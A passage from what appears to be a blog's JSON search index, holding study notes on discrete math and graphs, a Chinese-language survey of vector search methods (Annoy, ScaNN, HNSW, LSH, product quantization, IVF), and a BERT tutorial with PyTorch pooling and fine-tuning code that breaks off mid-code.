\\Rightarrow \\lnot P(x)\\). Sequence Def: ​ A sequence is a function \\(f: Z^+ \\to C\\). Ex: ​ \\(f(k) = (-1)^k(3*k)\\) Induction Goal: prove \\(P(n), \\forall n \\geqslant 1\\). Step 1: prove \\(P(a), P(b), ...,P(x)\\) is true. Step 2: Assume \\(P(k)\\) is true, Prove \\(P(k+1)\\) is true, \\(x &lt; k\\). Skipped things Relations of Sets. Permutation and combination. Bayes` theorem. Markov Chain. Graph Def: ​ A graph (V, E) has a set V called \"vertices\" and a set E called \"edges\" that consisting of two-element subsets of V. Ex: ​ \\(V = \\{A,B,C,D\\}\\) ​ \\(E = \\{\\{A,B\\}, \\{B,A\\}, \\{B,D\\}, \\{D,B\\}, \\{B,C\\}, \\{C,D\\}, \\{A,C\\}\\}\\) Complete Graph Def: ​ A simple undirected graph in which every pair of distinct vertices is connected by a unique edge. The notation is \\(K_n\\). The edge number is \\(\\frac {n(n-1)}{2}\\). Connected Graph Def: ​ A graph is connected if you can get from any vertex to any other via edges. Induced Subgraph Def: ​ \\((V_1, E_1)\\) is an induced subgraph of \\((V_2,E_2)\\) if it is a graph where \\(V_1 \\subseteq V_2\\) and \\(E_1\\) contains all possible edges consisting of vertices in \\(V_1\\) and \\(E_1 \\subset E_2\\). Degree Def: ​ The degree of a vertex is the number of edges attached. Fact: ​ Sum of degrees of all vertices is even. Cause every edge adds 2 degrees. Ex: ​ Among 5 people, could everyone be friends with exactly 2 people? The degree is \\(5 * 2=10\\), it`s possible. ​ Among 5 people, could everyone be friends with exactly 3 people? The degree is \\(5 * 3=15\\), it`s not possible. Euler Path Def: ​ An Euler Path walks through a graph using every edge exactly once. ​ An Euler Circuit starts and stops at the same vertex when walking through a Euler Path. Theorem: ​ If a graph has an Euler Circuit, then every vertex has even degree. Contrapositive Theorem: ​ If a graph has a vertex with odd degree, no Euler Circuit is possible.","categories":[{"name":"Math","slug":"Math","permalink":"https://racleray.github.io/categories/Math/"},{"name":"basic","slug":"Math/basic","permalink":"https://racleray.github.io/categories/Math/basic/"}],"tags":[{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"},{"name":"math","slug":"math","permalink":"https://racleray.github.io/tags/math/"}],"author":"HeRui"},{"title":"Embedding & Searching","slug":"Embedding-Searching","date":"2021-09-05T06:59:46.000Z","updated":"2023-08-07T11:54:31.028Z","comments":true,"path":"posts/9e991c30.html","link":"","permalink":"https://racleray.github.io/posts/9e991c30.html","excerpt":"","text":"相似性搜索常见于以图搜图，听歌识曲...这类抽象查找问题中。你没有明确的Key，不能使用SQL之类的方法查找数据库。但是可以通过抽象的 embedding 向量来进行检索。 一般样本向量表示可以通过 Skip-gram with negative sampling 方法、DSSM 这类方法、BERT 这类方法等等。得到向量表达之后，一般还需要高效的召回索引方法，因为暴力匹配在较大数据量场景下，速度通常差强人意。 这类通过抽象 embedding 的具有语义检索能力的方法，如下图所示： 一组相关算法的 benchmarks 对比图如下： Annoy Spotify音乐公司开源的工具库。 这是一种基于树的方法。 算法简单描述： 定义： N -- 树模型的总个数； ​ K -- 叶节点最大样本数； ​ M -- 目标Top M样本数； ​ D -- 联通两个子空间所要求的最大距离； 过程： ==建树== 1234for i in (1, ... , `N`): 1. 随机选取两个样本点，计算两者中点处超平面，划分两侧样本为两个子树； 2. 继续划分样本点，直到叶子节点中样本数不大于 `K`； 3. 保存二叉树（即保存每个划分点的值）； ==搜索== 1234567for j in (1, ... , `N`): 1. 从根节点开始，根据二分节点，向下遍历； 2. if 两个子空间相近（随机选的两个点距离小于 `D`），同时向两个子节点，向下遍历； 3. 保存找到的叶子节点空间（节点集合）；聚合`N`个叶子节点集合，以找到距离目标节点最近的 Top `M `个样本点；返回结果 Annoy利用二叉树的结构对空间进行随机划分，建索引阶段效率有所提升。二叉树结构在检索时效率也很高。 特点： 召回率较优，和暴力搜索法相比较基本一致 查询速度很快 千万量级的item，时间为若干小时，尚可以忍受 千万量级的item，以100棵树为例，索引文件大约几个G，有点大了 多核利用支持的不是很好 ScaNN ScaNN是google提出的高效向量检索算法，文中说这个方法比目前已有的其他方法有更高的精度，检索速度也要快两倍。工具库开源地址 GitHub。 这种算法主要是优化 Inner product 距离度量下的搜索。这类问题被叫做 maximum inner-product search (MIPS)。在大数据量场景下，MIPS的计算复杂度是比较高的，穷举搜索几乎不可能在期望的时间范围内完成。 论文中，阐述了目前使用的向量压缩（比如聚类或者降维）所使用方法，会使得压缩后的向量间平均距离变小。这可能导致了向量差异性的损失，比如与query向量的内积的相对大小关系会出现错误。比如这样： 上图中，x 被分别压缩到 c 点，其余 q 的内积大小关系发生颠倒。本来 \\(&lt;q,x_2&gt; greater\\ than &lt;q,x_1&gt;\\)， 压缩后 \\(&lt;q,x_1&gt; greater\\ than &lt;q,x_2&gt;\\)。 论文中指出，这种方法压缩，只考虑了距离的长度大小，而没有考虑距离的角度方向。 一个简单的例子，计算两个向量的内积，当一个向量在平行于投影方向（两个向量方向都可作为投影方向）变化 k ，内积的变化为 \\(d_1\\)。而如果实在一个向量的垂直方向，变化 k ，内积的变化为 \\(d_2\\)。那么，\\(d_2 ≥ d_1\\)一定成立。画个图就能验证。 所以，现在在压缩时，对于 x 与 c 在平行于 x 向量方向上的变化，给予一个大的惩罚项；而对于 x 与 c 在垂直于 x 向量方向上的变化，给予一个较小的惩罚项。以此来进行压缩。取了名字叫，Anisotropic Vector Quantization。 效果如下： 内积相对大小关系，没有变化。按照论文中的说法，这样做最大化了压缩后各个点之间的平均距离，有利于差异化相似度的值。 算法大致流程： 根据样本数量大小，选择是否将数据进行 Partitioning。若 Partitioning，在检索时，会先选出 Top m 个Partitioning，再进行细化检索。 Scoring：使用快速的粗粒度的距离度量，计算query相对所有样本（或Partition的样本）的距离。选出 Top k 个。 Rescoring: 对 Top k 个Scoring结果，进行更精确的距离度量，重拍后输出 Top k 的结果。 使用 doc 比较简短，可以参考。 HNSW HNSW是一种图算法。其根据搜索场景的特点，设计出了这种算法。 首先，简单想想图的搜索，麻烦的问题可能有哪些。可能有孤立的节点，或者可能相邻节点太多。在近邻搜索场景下，可能有几个距离目标很近的节点，但是没有相互连通，那么就需要遍历更多的路径，从而遍历完全这几个节点。 另外，节点众多时，当两个节点距离相对较远时，遍历数量会指数级增加。 HNSW的解决方法如下： 定义： ​ N -- 总样本数； ​ K -- 每个节点最多有K个相连的近邻节点； ​ P1 -- 以 P1 的概率将节点设置为二级索引； ​ P2 -- 以 P2 的概率将节点设置为一级索引（P1 &gt; P2，两者指数递减）； ​ M -- 目标Top M样本数； 过程： ==建图== 1234567891011121314151617181920for i in (1, ... , N): if (随机概率值 p) &gt; P1: 二级索引图插入节点： 1. 将被插入节点连接指向最近邻的 K 个节点（小于等于 K）； 2. 更新被连接的 K 个节点（小于等于 K）的最近邻的 K 个节点； 3. 保证每个节点都有连接，且最大连接不超过 K； if (随机概率值 p) &gt; P2: 一级索引图插入节点： 1. 将被插入节点连接指向最近邻的 K 个节点（小于等于 K）； 2. 更新被连接的 K 个节点（小于等于 K）的最近邻的 K 个节点； 3. 保证每个节点都有连接，且最大连接不超过 K； 全量样本索引图插入节点： 1. 将被插入节点连接指向最近邻的 K 个节点（小于等于 K）； 2. 更新被连接的 K 个节点（小于等于 K）的最近邻的 K 个节点； 3. 保证每个节点都有连接，且最大连接不超过 K； 返回建立的多级索引图 ==搜索== 1231. 在二级索引图中找到最近邻节点 A2. 在一级索引图中从 A 开始找到最近邻节点 B3. 在全量样本索引图中从 B 开始找到 Top M 的目标节点 HNSW设计的插入机制，保证了图具有良好的连通性和局部搜索便捷性。类似跳表结构的多级索引机制，提高了搜索效率，降低了整体搜索复杂度。 算法细节看文章，这里只是草草写写思想。开源工具库C++版：hnswlib 特点： 召回率优秀，和暴力搜索基本一致 千万量级的item，构图可在分钟级别完成 多核利用优秀 查询速度很快 LSH 在 min hash 之上，更进一步优化了在大量文本相似性聚类的算法。首先需要计算每一个文本的多个不同 min hash 表示，构成 min hash 值向量。然后对 min hash 向量分块进行简单的元素对比，检查是否相似。此处LSH，只关注基于 Jaccard similarity 的文本处理，其他LSH实现不涉及。 这就是一种基于词统计的 hash 分桶算法。其中没有计算欧式距离这种计算量较大的操作，仅仅是元素对比。 算法如下： 定义: K -- 取文本中连续 K 个词为bag of words的计数对象（这里被称为 K-Shingling）； ​ N -- min hash向量的维度，即进行随机 min hash 的次数； ​ M -- 文本总数； ​ b -- LSH中hash分组的组数； ​ r -- b组 min hash 子向量的维度； 过程： ==min hash== 1234561. 对整个文本集构建以 K 个连续词为一个对象的bag of words统计矩阵，文本中存在的对象标记为1，不存在标记为0；2. for i in (1, ... , N): A. 随机指定统计矩阵中一个 index 为起始位置（保存index）； B. 从 index 开始，在每一个文档列中，向下查找第一非 0 位置； C. 取第一非 0 位置与 index 位置的偏移量为 min hash 向量的第 i 行，有 M 个 min hash 向量；3. 得到 (N, M) 的 min hash 矩阵 ==局部敏感hash(LSH)== 1234561. 将 min hash 矩阵均分为 b 组；2. 分桶聚类： for j in (1, ..., b): A. 两两对比第 j 组 min hash 子向量； B. 子向量完全相同时，将该两个向量对应文本，放到一个相似桶中（类似聚类）；3. 保存分桶结果，每个桶中就是相似的文本 关于 min hash，它就是一种 Jaccrad similarity 的另一种表示。 \\(P(hash(S_i)=hash(S_j))\\) 就等价于 \\(Jaccard(S_i, S_j)\\)。证明也挺简单的： 只看两个 min hash 向量中不全为 0 的行，记为 \\(sub\\_hash\\)。 此时 \\(hash(S_i)=hash(S_j)\\) 概率就等价于 \\(sub\\_hash\\) 的第一行都为 1 的概率。 \\(sub\\_hash\\) 的第一行都为 1 的概率，就等于\\(sub\\_hash\\) 中｛两列都为 1 的行数 / 任意一列为 1 的行数｝。 \\(sub\\_hash\\) 中｛两列都为 1 的行数 / 任意一列为 1 的行数｝，就是 \\(Jaccard(S_i, S_j)\\)。 另外，调整参数 b 和 r 可以间接调整分桶的相似性阈值。假设两个 min hash 向量相似概率为 \\(p\\)。分到同一个桶中的概率可表示为（只要有一组 sub hash 相同就分到一个桶）： \\[ 1 - (1 - p^r)^b \\] 开源工具库：mattilyra/LSH 特点： 查找速度快 方便去重处理 处理大量数据速度较快 Product Quantizer Product Quantizer简称为PQ，是一种建立索引的方法。优化了K-Means聚类的计算量。 定义： ​ N -- 样本总量； ​ D -- embedding维度； ​ K -- 子空间数量； ​ C -- K-means聚类类别数； 过程： ==建索引== 123456781. 将 N 个 D 维embedding，切分为 K 组 (N, D/K) 的embedding；2. for i in (1, ..., K): A. 对第 i 个 (N, D/K)的embedding，计算 C 个聚类中心点3. for j in (1, ..., N): for k in (1, ..., K): A. 将第 j 个样本标记到第 k 组聚类的所属中心点编号； B. 循环得到第 j 个样本的 K 维中心点编号向量； 得到 (N, K) 的样本编码矩阵 ==搜索== 123456789101112131415161. 将输入 embedding 划分为 K 组 sub embedding；2. for i in (1, ..., K): for j in (1, ..., C): A. 计算 sub embedding 与聚类中心 j 的距离； B. 循环得到 C 维的距离向量； 循环得到 (K, C) 的距离矩阵3. 计算输入与所有样本的距离： for i in (1, ..., N): 取 (N, K) 的样本编码矩阵中第 i 行 (1, K), 记为 Q; 定义输入与样本 i 的距离为 di； for k in (1, ..., K): A. 取 Q[k] 的值，记为 q； B. 取 (K, C) 的距离矩阵中第 k 行，记为 dist； C. di += dist[q]; 记录输入与样本 i 的距离为 di 的值；4. 从 N 个 di 距离中找到需要的样本 这种方法，将暴力搜索，转化为 K * N 次距离表查找过程。 Inverted File System 这个方法（简称 IVF）相当于使用倒排表来优化索引。比如 IVF + PQ，来优化 K * N 次的查询操作。IVF， PQ 在 Faiss 库中都有实现。 简述一下方法： 在 PQ 建立索引的过程中增加一步： 将 (N, K) 的样本，分别保存到 C_ivf个聚类之下，即，保存到 C_ivf个代表一个类的数组中。得到 C_ivf 个类别字典，key 为聚类中心点（id），value 为该聚类中所有样本点的 PQ 编码数组。（按照 C_ivf个聚类类别进行倒排样本） 在 PQ 查询中增加一步： 在第三步第二层 for 循环中，先求得与输入样本最近的 C_ivf 聚类中心，然后在该聚类的 PQ 编码数组中计算每个样本与输入的距离。 利用倒排，减少了搜索范围。从全部样本搜索，变成先找聚类，再在类中搜索。 这里建立倒排的 K-means 聚类与 PQ 中使用的不同，使用一个更粗粒度的 K-means 聚类，但是没有对 N 个 embedding 进行划分。 显然，IVF虽然建立索引的过程更复杂一些，但是搜索的过程会更快速。 Structure-based Approximations 这类近似搜索，将搜索过程抽象为一个神经网络表示的函数，输入对象，输出搜索结果。当然以下方法需要监督数据支持，或者可以构建无监督的共现关系。 Negative sampling softmax: 简化版的NCE近似计算，将多分类，转为多个正负例二分类。复杂的负例分布抽样时，可以采用importance sampling进行简化。 Class-based softmax: 使用两个softmax，第一个预测 class，第二个基于输入和 class 预测搜索目标。 Hierarchical softmax： 构建 Huffman tree，然后每个节点只进行一个二值分类预测，直到叶子节点。预测直接变成了 tree height 次二分类计算。 Binary code prediction： 将所有对象的index，转化为二进制表示，使用多个sigmoid，预测每个位置是 0 还是 1，得到目标index的二进制表示。 Embedding Prediction： 预测 embedding 表示。这个方法是对 Embedding inference 模型的近似，思路基本上和蒸馏差不多。对于下游搜索匹配，没有影响。这个方法用到一种损失，Von-Mises Fisher distribution loss，约束了输出embedding靠近一个单位球面（超球面）。 End 相似性搜索，和计算 margin loss 的分类问题目标比较接近。 \\[ Loss_{margin}(x,y,\\hat{y})=max(0, 1+s(\\hat{y}|x)-s(y|x)) \\] 另外，基于树的搜索，还有KD Tree算法，这里不涉及。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"searching","slug":"searching","permalink":"https://racleray.github.io/tags/searching/"}]},{"title":"Practical BERT","slug":"Practical-BERT","date":"2021-07-22T08:01:17.000Z","updated":"2023-08-07T11:54:31.033Z","comments":true,"path":"posts/372ecc5c.html","link":"","permalink":"https://racleray.github.io/posts/372ecc5c.html","excerpt":"","text":"BERT类模型，基本使用流程：1. Further pretrain. 2. single-task or multi-task finetuning. 3. inference Further pretraining一般使用任务数据进行，也可以使用与任务数据相似的 in-domain 数据，或者使用数据量更大但是和任务数据不那么相关的数据进行。 一般而言使用任务数据的效果会好一些。但是数据量不足，且能找到与任务数据相似的 in-domain 数据，也可以稳定提高模型效果。（ref） Transformer Representations Transformer 不同的层捕获不同层次的表示。比如、下层是表层（字、词）特征，中层是句法特征，上层是语义特征。 如图为不同的embedding表示，输入BiLSTM进行NER任务的结果对比。 BERT的不同层编码的信息非常不同，因此适当的池化策略，应该根据不同应用而改变，因为不同的层编码不同的信息。 Hugging Face的BERT模型一般输出为： last hidden state (batch size, seq len, hidden size) which is the sequence of hidden states at the output of the last layer. pooler output (batch size, hidden size) - Last layer hidden-state of the first token of the sequence hidden states (n layers, batch size, seq len, hidden size) - Hidden states for all layers and for all ids. Pooler output pooler output，最后一层的[CLS] token的hidden state，接一个Linear layer 和一个 Tanh activation function的结果。预训练时，作为next sentence prediction (classification) objective的计算结果。 在config中可以设置 pooling layer 为 False，不输出这一结果。 1234567891011121314151617181920212223242526...max_seq_length = 256_pretrained_model = 'roberta-base'config = AutoConfig.from_pretrained(_pretrained_model)model = AutoModel.from_pretrained(_pretrained_model, config=config)tokenizer = AutoTokenizer.from_pretrained(_pretrained_model)clear_output()features = tokenizer.batch_encode_plus( train_text, add_special_tokens=True, padding='max_length', max_length=max_seq_length, truncation=True, return_tensors='pt', return_attention_mask=True)outputs = model(features['input_ids'], features['attention_mask'])pooler_output = outputs[1]logits = nn.Linear(config.hidden_size, 1)(pooler_output) # regression head... More than last hidden state 最后一层输出的 hidden state，[batch, maxlen, hidden_state]。其中[batch, 1, hidden_state]对应 [CLS]。 CLS Embeddings 12345with torch.no_grad(): outputs = model(features['input_ids'], features['attention_mask'])last_hidden_state = outputs[0]cls_embeddings = last_hidden_state[:, 0] 可以处理简单的下游任务，将cls_embeddings作为整个序列的一个简单表示。 Mean Pooling 1234567891011121314151617181920212223features = tokenizer.batch_encode_plus( train_text, add_special_tokens=True, padding='max_length', max_length=max_seq_length, truncation=True, return_tensors='pt', return_attention_mask=True)attention_mask = features['attention_mask']...# Step 1: Expand Attention Mask from [batch_size, max_len] to [batch_size, max_len, hidden_size].input_mask_expanded = attention_mask.unsqueeze(-1).expand(last_hidden_state.size()).float()# Step 2: Sum Embeddings along max_len axis so now we have [batch_size, hidden_size]sum_embeddings = torch.sum(last_hidden_state * input_mask_expanded, 1)# Step 3: Sum Mask along max_len axis.sum_mask = input_mask_expanded.sum(1)sum_mask = torch.clamp(sum_mask, min=1e-9)# Step 4: Take Average.mean_embeddings = sum_embeddings / sum_masklogits = nn.Linear(config.hidden_size, 1)(mean_embeddings) # regression head 在max len维度，进行平均。 Max Pooling 在max len维度，进行max pooling 123# input_mask_expanded = attention_mask.unsqueeze(-1).expand(last_hidden_state.size()).float()# last_hidden_state[input_mask_expanded == 0] = -1e9 # Set padding tokens to large negative valuemax_embeddings = torch.max(last_hidden_state, 1)[0] Mean-Max Pooling (Head) 123456789101112input_mask_expanded = attention_mask.unsqueeze(-1).expand(last_hidden_state.size()).float()sum_embeddings = torch.sum(last_hidden_state * input_mask_expanded, 1)sum_mask = input_mask_expanded.sum(1)sum_mask = torch.clamp(sum_mask, min=1e-9)mean_embeddings = sum_embeddings / sum_maskmax_pooling_embeddings, _ = torch.max(last_hidden_state, 1)cls_embeddings = last_hidden_state[:, 0]mean_max_embeddings = torch.cat((mean_pooling_embeddings, max_pooling_embeddings, cls_embeddings), 1)logits = nn.Linear(config.hidden_size * 3, 1)(mean_max_embeddings) # 3 hidden size Conv-1D Pooling 12345678# first define layerscnn1 = nn.Conv1d(768, 256, kernel_size=2, padding=1)cnn2 = nn.Conv1d(256, 1, kernel_size=2, padding=1)last_hidden_state = last_hidden_state.permute(0, 2, 1) # (batch size, hidden size, seq len)cnn_embeddings = F.relu(cnn1(last_hidden_state))cnn_embeddings = cnn2(cnn_embeddings)logits, _ = torch.max(cnn_embeddings, 2) # max pooling in Length dim More than Hidden States Output embeddings 与 每一层的输出集合，(n_layers, batch_size, sequence_length, hidden_size)。 123456789101112131415161718192021222324...max_seq_length = 256_pretrained_model = 'roberta-base'config = AutoConfig.from_pretrained(_pretrained_model)# 设置输出选项config.update(&#123;'output_hidden_states':True&#125;)model = AutoModel.from_pretrained(_pretrained_model, config=config)tokenizer = AutoTokenizer.from_pretrained(_pretrained_model)clear_output()features = tokenizer.batch_encode_plus( train_text, add_special_tokens=True, padding='max_length', max_length=max_seq_length, truncation=True, return_tensors='pt', return_attention_mask=True)with torch.no_grad(): outputs = model(features['input_ids'], features['attention_mask'])all_hidden_states = torch.stack(outputs[2]) CLS Layer Embeddings 倒数第二层示例 1234layer_index = 11 # second to last hidden layercls_embeddings = all_hidden_states[layer_index, :, 0] # 13 layers (embedding + num of blocks)logits = nn.Linear(config.hidden_size, 1)(cls_embeddings) # regression head GitHub的bert-as-service 项目，就是默认取得倒数第二层的输出。更好地表示语义，而不被MLM任务和NSP任务影响太多。 Concatenate Pooling 最后四层 CLS concat. 12345678all_hidden_states = torch.stack(outputs[2])concatenate_pooling = torch.cat( (all_hidden_states[-1], all_hidden_states[-2], all_hidden_states[-3], all_hidden_states[-4]), -1)concatenate_pooling = concatenate_pooling[:, 0] # first tokenlogits = nn.Linear(config.hidden_size*4, 1)(concatenate_pooling) Weighted Layer Pooling 基于一个intuition，fine-tuning时，最容易被训练的应该是middle layer的表达，因为顶层是专门用于 language modeling pre-train 任务的。所以只使用顶层的输出进行下游任务，会限制模型的效果。（没有实证，一个假设） 12345678910111213141516171819202122232425class WeightedLayerPooling(nn.Module): def __init__(self, num_hidden_layers, layer_start: int = 4, layer_weights = None): super(WeightedLayerPooling, self).__init__() self.layer_start = layer_start self.num_hidden_layers = num_hidden_layers self.layer_weights = layer_weights if layer_weights is not None \\ else nn.Parameter( torch.tensor([1] * (num_hidden_layers+1 - layer_start), dtype=torch.float) ) def forward(self, all_hidden_states): all_layer_embedding = all_hidden_states[self.layer_start:, :, :, :] weight_factor = self.layer_weights.unsqueeze(-1).unsqueeze(-1).unsqueeze(-1).expand(all_layer_embedding.size()) weighted_average = (weight_factor*all_layer_embedding).sum(dim=0) / self.layer_weights.sum() return weighted_average # 使用：最后四层的 CLS 表示，计算加权和layer_start = 9pooler = WeightedLayerPooling( config.num_hidden_layers, layer_start=layer_start, layer_weights=None)weighted_pooling_embeddings = pooler(all_hidden_states)weighted_pooling_embeddings = weighted_pooling_embeddings[:, 0]logits = nn.Linear(config.hidden_size, 1)(weighted_pooling_embeddings) LSTM/GRU Pooling \\[ o = h^L_{LSTM} =LSTM(h^i_{CLS}), i ∈ [1, L] \\] CLS token输入LSTM，得到最终表示 12345678910111213141516171819202122class LSTMPooling(nn.Module): def __init__(self, num_layers, hidden_size, hiddendim_lstm): super(LSTMPooling, self).__init__() self.num_hidden_layers = num_layers self.hidden_size = hidden_size self.hiddendim_lstm = hiddendim_lstm self.lstm = nn.LSTM(self.hidden_size, self.hiddendim_lstm, batch_first=True) self.dropout = nn.Dropout(0.1) def forward(self, all_hidden_states): ## forward hidden_states = torch.stack([all_hidden_states[layer_i][:, 0].squeeze() for layer_i in range(1, self.num_hidden_layers+1)], dim=-1) hidden_states = hidden_states.view(-1, self.num_hidden_layers, self.hidden_size) out, _ = self.lstm(hidden_states, None) out = self.dropout(out[:, -1, :]) return outhiddendim_lstm = 256pooler = LSTMPooling(config.num_hidden_layers, config.hidden_size, hiddendim_lstm)lstm_pooling_embeddings = pooler(all_hidden_states)logits = nn.Linear(hiddendim_lstm, 1)(lstm_pooling_embeddings) # regression head Attention Pooling dot-product attention： \\[ o = W^T_{h} softmax(qh^T_{CLS})h_{CLS} \\] \\(W^T_{h}\\) 和 \\(q\\)为可学习参数。 1234567891011121314151617181920212223242526272829303132class AttentionPooling(nn.Module): def __init__(self, num_layers, hidden_size, hiddendim_fc): super(AttentionPooling, self).__init__() self.num_hidden_layers = num_layers self.hidden_size = hidden_size self.hiddendim_fc = hiddendim_fc self.dropout = nn.Dropout(0.1) q_t = np.random.normal(loc=0.0, scale=0.1, size=(1, self.hidden_size)) self.q = nn.Parameter(torch.from_numpy(q_t)).float() w_ht = np.random.normal(loc=0.0, scale=0.1, size=(self.hidden_size, self.hiddendim_fc)) self.w_h = nn.Parameter(torch.from_numpy(w_ht)).float() def forward(self, all_hidden_states): hidden_states = torch.stack([all_hidden_states[layer_i][:, 0].squeeze() for layer_i in range(1, self.num_hidden_layers+1)], dim=-1) hidden_states = hidden_states.view(-1, self.num_hidden_layers, self.hidden_size) out = self.attention(hidden_states) out = self.dropout(out) return out def attention(self, h): v = torch.matmul(self.q, h.transpose(-2, -1)).squeeze(1) v = F.softmax(v, -1) v_temp = torch.matmul(v.unsqueeze(1), h).transpose(-2, -1) v = torch.matmul(self.w_h.transpose(1, 0), v_temp).squeeze(2) return vhiddendim_fc = 128pooler = AttentionPooling(config.num_hidden_layers, config.hidden_size, hiddendim_fc)attention_pooling_embeddings = pooler(all_hidden_states)logits = nn.Linear(hiddendim_fc, 1)(attention_pooling_embeddings) # regression head WKPooling 来自论文: SBERT-WK: A Sentence Embedding Method By Dissecting BERT-based Word Models 通过计算 每一层每个token的 alignment and novelty properties，得到每个token的 unified word representation。然后根据计算得到每个token 的 word importance ，加权求和得到一个 Sentence Embedding 表示。 计算中用到 QR分解，然而pytorch在GPU上计算QR很慢，所以转到CPU上计算，但是这依然很慢（相比于其他在GPU上的操作）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192class WKPooling(nn.Module): def __init__(self, layer_start: int = 4, context_window_size: int = 2): super(WKPooling, self).__init__() self.layer_start = layer_start self.context_window_size = context_window_size def forward(self, all_hidden_states): ft_all_layers = all_hidden_states org_device = ft_all_layers.device all_layer_embedding = ft_all_layers.transpose(1,0) all_layer_embedding = all_layer_embedding[:, self.layer_start:, :, :] # Start from 4th layers output # torch.qr is slow on GPU (see https://github.com/pytorch/pytorch/issues/22573). So compute it on CPU until issue is fixed all_layer_embedding = all_layer_embedding.cpu() attention_mask = features['attention_mask'].cpu().numpy() unmask_num = np.array([sum(mask) for mask in attention_mask]) - 1 # Not considering the last item embedding = [] # One sentence at a time for sent_index in range(len(unmask_num)): sentence_feature = all_layer_embedding[sent_index, :, :unmask_num[sent_index], :] one_sentence_embedding = [] # Process each token for token_index in range(sentence_feature.shape[1]): token_feature = sentence_feature[:, token_index, :] # 'Unified Word Representation' token_embedding = self.unify_token(token_feature) one_sentence_embedding.append(token_embedding) ##features.update(&#123;'sentence_embedding': features['cls_token_embeddings']&#125;) one_sentence_embedding = torch.stack(one_sentence_embedding) sentence_embedding = self.unify_sentence(sentence_feature, one_sentence_embedding) embedding.append(sentence_embedding) output_vector = torch.stack(embedding).to(org_device) return output_vector def unify_token(self, token_feature): ## Unify Token Representation window_size = self.context_window_size alpha_alignment = torch.zeros(token_feature.size()[0], device=token_feature.device) alpha_novelty = torch.zeros(token_feature.size()[0], device=token_feature.device) for k in range(token_feature.size()[0]): left_window = token_feature[k - window_size:k, :] right_window = token_feature[k + 1:k + window_size + 1, :] window_matrix = torch.cat([left_window, right_window, token_feature[k, :][None, :]]) Q, R = torch.qr(window_matrix.T) r = R[:, -1] alpha_alignment[k] = torch.mean(self.norm_vector(R[:-1, :-1], dim=0), dim=1).matmul(R[:-1, -1]) / torch.norm(r[:-1]) alpha_alignment[k] = 1 / (alpha_alignment[k] * window_matrix.size()[0] * 2) alpha_novelty[k] = torch.abs(r[-1]) / torch.norm(r) # Sum Norm alpha_alignment = alpha_alignment / torch.sum(alpha_alignment) # Normalization Choice alpha_novelty = alpha_novelty / torch.sum(alpha_novelty) alpha = alpha_novelty + alpha_alignment alpha = alpha / torch.sum(alpha) # Normalize out_embedding = torch.mv(token_feature.t(), alpha) return out_embedding def norm_vector(self, vec, p=2, dim=0): ## Implements the normalize() function from sklearn vec_norm = torch.norm(vec, p=p, dim=dim) return vec.div(vec_norm.expand_as(vec)) def unify_sentence(self, sentence_feature, one_sentence_embedding): ## Unify Sentence By Token Importance sent_len = one_sentence_embedding.size()[0] var_token = torch.zeros(sent_len, device=one_sentence_embedding.device) for token_index in range(sent_len): token_feature = sentence_feature[:, token_index, :] sim_map = self.cosine_similarity_torch(token_feature) var_token[token_index] = torch.var(sim_map.diagonal(-1)) var_token = var_token / torch.sum(var_token) sentence_embedding = torch.mv(one_sentence_embedding.t(), var_token) return sentence_embedding def cosine_similarity_torch(self, x1, x2=None, eps=1e-8): x2 = x1 if x2 is None else x2 w1 = x1.norm(p=2, dim=1, keepdim=True) w2 = w1 if x2 is x1 else x2.norm(p=2, dim=1, keepdim=True) return torch.mm(x1, x2.t()) / (w1 * w2.t()).clamp(min=eps) 123pooler = WKPooling(layer_start=9)wkpooling_embeddings = pooler(all_hidden_states)logits = nn.Linear(config.hidden_size, 1)(wkpooling_embeddings) # regression head Other methods Dense Pooling Word Weight (TF-IDF) Pooling Async Pooling Parallel / Heirarchical Aggregation 每个任务上，不同的方法表现有差异，应该根据情况选择使用不同的方法。 Few-Shot Stability Fine-tuning Transformer models通常不稳定，收到超参数的影响大，不同的 random seed 也会导致不同的结果。 比如，在训练时，每个epoch中多进行evaluating，而不是在每个epoch之后evaluating，能够增加stability。 其他方法有： Debiasing Omission In BertADAM Re-Initializing Transformer Layers Utilizing Intermediate Layers Layer-wise Learning Rate Decay (LLRD) Mixout Regularization Pre-trained Weight Decay Stochastic Weight Averaging 通常不会一起用，可能会互向影响。方法各自提出的环境也不同。所以一般一两种方法的使用，能够提高模型性能。 Debiasing Omission In BERTAdam 1234rescaled_grad = clip(grad * rescale_grad, clip_gradient)m = beta1 * m + (1 - beta1) * rescaled_gradv = beta2 * v + (1 - beta2) * (rescaled_grad**2)w = w - learning_rate * (m / (sqrt(v) + epsilon) + wd * w) 和标准Adam，差别在于 wd * w，增加了 weight decay。论文 Fixing Weight Decay Regularization in Adam 中提出的 AdamW，保留了 bias-correction terms （上面伪代码第2，3行），并且将 wd * w 加入 learning_rate 的影响。将下图中的紫色 weight decay 方法，改为绿色的部分。这样更新 x 时，weight decay 不会耦合参数 \\(\\beta\\) 和 \\(w_t\\)（第7、8行），而是直接作用于 x（第12行）。 Debiasing Omission就是要保留 bias-correction terms 。在HuggingFace Transformers AdamW中设置 correct_bias parameter 为 True （default）。 1234567891011121314151617181920lr = 2e-5epsilon = 1e-6weight_decay = 0.01no_decay = [\"bias\", \"LayerNorm.weight\"]optimizer_grouped_parameters = [&#123; \"params\": [p for n, p in model.named_parameters() if not any(nd in n for nd in no_decay)], \"weight_decay\": weight_decay, \"lr\": lr&#125;, &#123;\"params\": [p for n, p in model.named_parameters() if any(nd in n for nd in no_decay)], \"weight_decay\": 0.0, \"lr\": lr&#125;]optimizer = AdamW( optimizer_grouped_parameters, lr=lr, eps=epsilon, correct_bias=True) Reinitializing Transformer Layers 来自计算机视觉的直觉，高层与预训练任务相关的层，可以重新训练。 比如，Reinitialize Pooler layer的参数 12345678910111213141516171819202122232425add_pooler = Truereinit_pooler = Trueclass Net(nn.Module): def __init__(self, config, _pretrained_model, add_pooler): super(Net, self).__init__() self.roberta = RobertaModel.from_pretrained(_pretrained_model, add_pooling_layer=add_pooler) self.classifier = RobertaClassificationHead(config) def forward(self, input_ids, attention_mask): outputs = self.roberta(input_ids, attention_mask=attention_mask,) sequence_output = outputs[0] logits = self.classifier(sequence_output) return logits model = Net(config, _pretrained_model, add_pooler)if reinit_pooler: print('Reinitializing Pooler 